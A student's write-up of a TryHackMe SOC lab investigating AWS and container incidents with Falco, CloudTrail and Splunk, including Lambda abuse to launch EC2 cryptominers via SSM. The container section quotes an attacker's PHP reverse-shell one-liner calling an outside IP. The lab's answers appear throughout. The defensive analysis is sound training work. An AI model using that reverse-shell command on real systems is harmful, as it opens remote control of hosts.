# [Cloud Security for SOC]

**TryHackMe Path**: [SOC Level 2]  
**Lab Topic**: [Monitoring AWS Workloads]  
**Date Completed**: [11/23/2026]

**Lab Link**: [https://tryhackme.com/room/monitoringawsworkloads]

---

## 🧠 Summary

> In this lab, I learned how applications run within Amazon Web Services (AWS) and explored the key components involved in hosting, managing, and monitoring cloud-based applications.
I gained a better understanding of AWS infrastructure, application architecture, and the importance of monitoring logs, performance metrics, and security events. This lab
strengthened my knowledge of cloud security monitoring and helped me understand how security analysts can identify suspicious activity, investigate potential threats, and maintain
visibility into applications operating in AWS environments.
---

## 🎯 Objectives

- [ ] Learn about EC2 Systems Manager and EC2 Auto Scaling
- [ ] Explore the challenges when monitoring containers in AWS
- [ ] Discover Falco as a tool for container-aware runtime monitoring
- [ ] Dive into less common attacks involving AWS Lambda functions
- [ ] Practice the material in Splunk via CloudTrail and Falco datasets

---


## 🧰 Tools Used
- THM AttackBox
- Splunk

---

## 📊 Analysis & Screenshots

*** Falco for EC2 ***

> For this section of the lab, I was tasked with analyzing the format in which Falco records raw events and high-level alerts within a Splunk instance. I was then required to answer
a series of questions based on my findings.

For the first question, I had to determine when Morgan Blake's local password was changed by investigating the low-level Falco events originating from the EC2 instance, ec2-demo.

Upon further investigation, I was able to identify that the password change occurred on January 14, 2026, at 23:44:19.
>
> <img width="659" height="434" alt="1" src="https://github.com/user-attachments/assets/79c7ea1b-156c-4a03-8ab2-2b2497d7439b" />
> <img width="917" height="468" alt="2" src="https://github.com/user-attachments/assets/8af9e608-5df5-436f-b992-5669930cd916" />
> <img width="906" height="719" alt="3" src="https://github.com/user-attachments/assets/519d656e-2b75-4ab1-8c06-caf78c4f9ddc" />

> I then continued my investigation by analyzing the Falco events to identify the GitHub repository that Morgan Blake cloned onto the virtual machine (VM). Upon further analysis, I
determined that the repository was named react-boilerplate.
>
> <img width="752" height="385" alt="4" src="https://github.com/user-attachments/assets/2d654b27-e664-4649-9c07-d3018fe2702d" />
> <img width="739" height="664" alt="5" src="https://github.com/user-attachments/assets/59a56a76-1b41-4a42-89d4-c6e28186b0cd" />

> After shifting my investigation to the high-level alerts originating from srv-prodgw, I analyzed the Falco alerts to determine which security rule had been triggered. Upon further
investigation, I identified the rule responsible for generating the alert as "Search Private Keys or Passwords."
>
> <img width="1293" height="934" alt="6" src="https://github.com/user-attachments/assets/50793f89-6af3-43a4-8267-9a5a6ccbd479" />

*** Falco for Containers ***

> Moving on to this section of the lab, I was tasked with investigating a container breach involving a vulnerable web application by analyzing security events within a Splunk
instance. I was then required to answer a series of questions based on my findings.

For the first question, I had to identify the two containers visible within the Falco logs. Upon further investigation and analysis of the recorded events, I was able to determine 
that the two containers were thm-db and thm-web.
>
> <img width="633" height="606" alt="7" src="https://github.com/user-attachments/assets/d4ffec4e-84c1-45f8-93b7-b9fd471d6087" />
> <img width="1051" height="489" alt="8" src="https://github.com/user-attachments/assets/06ad9989-3837-4345-92cb-4ea5f6461ecc" />

> I then continued my investigation by analyzing the Falco logs to identify the container image used by the web container. Upon further examination of the recorded events, I was able
to determine that the web container was running the image thm/website:latest.
>
> <img width="1020" height="945" alt="9" src="https://github.com/user-attachments/assets/dc3acc86-801c-49c6-90e2-579883a04017" />

> I then continued my investigation by analyzing the Falco logs to identify the absolute path of the Apache web server running within the container. Upon further examination of the
recorded events, I was able to determine that the Apache web server executable was located at /usr/sbin/apache2.
>
> <img width="748" height="366" alt="10" src="https://github.com/user-attachments/assets/431c5dfb-dfe4-47a8-92be-94b448936aaa" />
> <img width="1559" height="827" alt="11" src="https://github.com/user-attachments/assets/dd43f53d-9a20-4c9f-825e-636ff6ec029f" />

> I then continued my investigation by analyzing the Falco logs to identify the first discovery command executed through the compromised web application. Upon further examination of
the recorded events, I was able to determine that the first command executed was whoami, which is commonly used to identify the current user account under which a process or command
is running.
>
> <img width="909" height="395" alt="12" src="https://github.com/user-attachments/assets/52175beb-35ca-4b42-9635-18274af75af1" />
> <img width="876" height="669" alt="13" src="https://github.com/user-attachments/assets/3cb196e7-e78b-4095-b70d-082df4adc477" />

> I then continued my investigation by analyzing the Falco logs to identify the command used by the attacker to establish a reverse shell connection from the compromised web
container. Upon further examination of the recorded events, I determined that the attacker executed the following PHP command:

php -r '$sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");'

This command was used to initiate an outbound connection to the attacker's IP address, 115.190.98.228, over port 9999, with the intention of establishing a reverse shell. This 
technique can allow an attacker to execute commands remotely within the compromised container, potentially enabling further reconnaissance, privilege escalation, and lateral movement 
within the environment.
>
> <img width="1292" height="785" alt="14" src="https://github.com/user-attachments/assets/fd6d9361-1389-48c8-b5ff-6da4331d4990" />

*** AWS Lambda Throry ***

> For this section of the lab, I was tasked with exploring the AWS Lambda events associated with the img-processor function within a Splunk instance. I was then required to answer a
series of questions based on my findings.

For the first question, I had to identify the IAM role assigned to the Lambda function during its creation. Upon further investigation and analysis of the recorded events, I was able 
to determine that the role assigned to the function was img-processor-role-ztpjz457.
>
> <img width="1206" height="986" alt="15" src="https://github.com/user-attachments/assets/d72c015f-5771-4963-897d-5f746ea648f0" />

> I then continued my investigation by analyzing the AWS Lambda events within Splunk to identify the updated CodeSha256 value following a modification to the function's code. Upon
further examination of the recorded events, I was able to determine that the SHA-256 hash associated with the updated function code was:

JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=

This value serves as a unique identifier for the deployed function code, allowing security analysts to track code modifications and investigate potentially unauthorized changes 
within the AWS environment.
>
> <img width="1047" height="856" alt="16" src="https://github.com/user-attachments/assets/529d0c58-d636-42b0-8472-6c0814b9415a" />

> I then continued my investigation by analyzing the AWS Lambda events within Splunk to identify changes made to the function's execution role. Upon further examination of the
recorded events, I discovered that the function's original IAM execution role had been modified. I was able to determine that the newly assigned execution role was ImageProcessorRole.

This finding highlights the importance of monitoring IAM role modifications within AWS environments, as changes to a Lambda function's execution role can alter its permissions and 
potentially introduce security risks if unauthorized access is granted.
>
> <img width="742" height="239" alt="17" src="https://github.com/user-attachments/assets/6dd06cbe-2efa-416a-898a-33ee8557dc95" />

> I then continued my investigation by analyzing the AWS CloudTrail events within Splunk to identify the event associated with making the Lambda function publicly accessible. Upon
further examination of the recorded events, I was able to determine that the CloudTrail event responsible for modifying the function's resource-based permissions was AddPermission20150331v2.

This finding highlights the importance of monitoring changes to AWS Lambda resource-based policies, as improperly configured permissions can expose functions to unauthorized access. 
By identifying this event, I gained a better understanding of how security analysts can detect potential misconfigurations and investigate changes that could compromise the security 
of cloud-based applications.
>
> <img width="1492" height="1055" alt="18" src="https://github.com/user-attachments/assets/da86d28f-64df-4f25-895b-cd57764582d9" />

*** AWS Lambda Practice ***

> For this final section of the lab, I was tasked with investigating the events recorded within index=task7 in a Splunk instance. I was then required to answer a series of questions
based on my findings.

For the first question, I had to identify the IAM user and access key associated with interactions involving the AWS Lambda service. Upon further investigation and analysis of the 
recorded events, I was able to determine that the IAM user was carl.brown, and the associated access key ID was AKIAVZZK4G6EZH7GIZY3.

This finding highlights the importance of analyzing AWS CloudTrail logs to identify user activity and track access key usage within cloud environments. By correlating IAM identities 
with their associated access keys, security analysts can investigate potentially unauthorized API activity and better understand which identities are responsible for changes made to 
AWS resources.
>
> <img width="909" height="448" alt="19" src="https://github.com/user-attachments/assets/de1cfd59-5896-4c1a-911a-34108bf5e6b3" />
> <img width="1060" height="511" alt="20" src="https://github.com/user-attachments/assets/be8bfd3e-f896-45e5-a15f-6ee8f54cc609" />

> I then continued my investigation by analyzing the AWS Lambda events within Splunk to identify the size of the malicious Python code uploaded by the attacker. Upon further
examination of the recorded events, I discovered that the attacker had overwritten the Lambda function's original code with malicious code. I was able to determine that the size of the uploaded Python code was 1,837 bytes.

This finding highlights the importance of monitoring AWS Lambda code modifications, as unauthorized changes can introduce malicious functionality into cloud-based applications. By 
analyzing CloudTrail events and identifying suspicious code updates, security analysts can detect potential compromises, investigate unauthorized activity, and assess the impact of 
malicious modifications within AWS environments.
>
> <img width="1011" height="657" alt="21" src="https://github.com/user-attachments/assets/39dff18b-5c7e-4c9c-8916-283b8dd8e19a" 
> <img width="1296" height="640" alt="23" src="https://github.com/user-attachments/assets/90c77116-d39f-4558-bc9f-b0c3acbc320a" />

> I then continued my investigation by analyzing the AWS CloudTrail events within Splunk to identify the EC2 instances launched as a result of the malicious code executed through the
compromised Lambda function. Upon further examination of the recorded events, I discovered that the malicious code initiated the launch of two EC2 instances. I was able to identify
the associated instance IDs as i-054e705408f5fa5de and i-056219235e66e3f94.

This finding highlights the importance of monitoring unauthorized EC2 instance creation within AWS environments, as attackers can exploit compromised Lambda functions to provision 
additional cloud resources for malicious purposes. By correlating Lambda execution activity with EC2 API events, security analysts can identify suspicious resource creation, 
investigate potential privilege abuse, and assess the broader impact of a cloud-based security incident.
>
> <img width="1341" height="896" alt="24" src="https://github.com/user-attachments/assets/24777ca3-0d78-406b-b928-2c464e12d354" />
> <img width="1223" height="752" alt="25" src="https://github.com/user-attachments/assets/7bf7a296-b28a-4154-88a7-4b7762696209" />

> I then continued my investigation by analyzing the AWS CloudTrail events within Splunk to identify how the attacker modified the Lambda function's code to install cryptocurrency
mining malware on the EC2 instances through AWS Systems Manager (SSM). Upon further examination of the recorded events, I discovered that the attacker had updated the malicious code
to leverage SSM for remote command execution. I was able to determine that the SSM document used to execute the malware installation commands was AWS-RunShellScript.

This finding highlights the importance of monitoring AWS Systems Manager activity, as attackers can exploit legitimate administrative tools to execute malicious commands on 
compromised cloud resources. By correlating Lambda code modifications with SSM command execution and EC2 activity, security analysts can identify unauthorized operations, investigate 
potential cryptojacking incidents, and assess the broader security implications of compromised AWS infrastructure.
>
> <img width="1073" height="666" alt="27" src="https://github.com/user-attachments/assets/fb81fc3a-12e6-4178-9aa2-cac22c47a9ba" />

> Finally, I continued my investigation by analyzing the AWS CloudTrail events within Splunk to identify the user-agent associated with the malicious API activity originating from
the compromised Lambda function. Upon further examination of the recorded events, I was able to determine that the user-agent was Boto3/1.40.4, indicating that the AWS SDK for Python
(Boto3) was used to interact with AWS services programmatically.

This finding highlights the importance of examining user-agent information within AWS CloudTrail logs, as it can provide valuable insight into the tools and software used to execute 
API requests. By correlating user-agent details with Lambda function modifications, EC2 instance activity, and AWS Systems Manager commands, security analysts can better understand 
the attacker's techniques, reconstruct the sequence of malicious actions, and identify potential indicators of compromise within the AWS environment.
>
> <img width="570" height="323" alt="26" src="https://github.com/user-attachments/assets/cd1a8309-bce4-49fa-b275-33279aa1e9e4" />

---

## Reflection

> This lab helped me develop a better understanding of how applications operate within AWS and why effective monitoring is essential for maintaining security in cloud environments.
One of my key takeaways was recognizing the importance of understanding cloud infrastructure before attempting to detect and investigate potential threats. As I continue developing
my cybersecurity skills, I realize that cloud security requires visibility into application behavior, system activity, and security logs. This experience reinforced the importance of
continuous monitoring and strengthened my interest in cloud security and incident response. Moving forward, I plan to build on this knowledge by gaining more hands-on experience
analyzing AWS logs, identifying suspicious activity, and investigating cloud-based security incidents.
